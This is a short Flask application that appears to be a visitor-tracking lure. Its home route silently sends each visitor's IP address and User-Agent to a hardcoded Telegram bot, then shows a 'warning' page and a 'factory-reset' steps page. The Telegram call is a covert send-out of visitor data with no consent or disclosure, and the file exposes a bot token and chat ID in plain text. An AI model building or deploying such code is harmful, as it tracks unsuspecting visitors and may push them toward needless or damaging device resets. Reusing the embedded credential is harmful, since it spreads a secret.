from flask import Flask, request, render_template
import requests

app = Flask(__name__)

TOKEN = "7841848440:AAHtuk7_YnHnhy9ICjZ6qkdtHboTVtLYQGI"
CHAT_ID = "6938379869"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, data=data)
    except:
        pass

@app.route('/')
def home():
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    message = f"🚨 شخص دخل الصفحة:\\n📍 IP: {user_ip}\\n📱 جهاز: {user_agent}"
    send_to_telegram(message)
    return render_template("warning.html")

@app.route('/factory-reset')
def factory_reset():
    return render_template("reset_steps.html")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
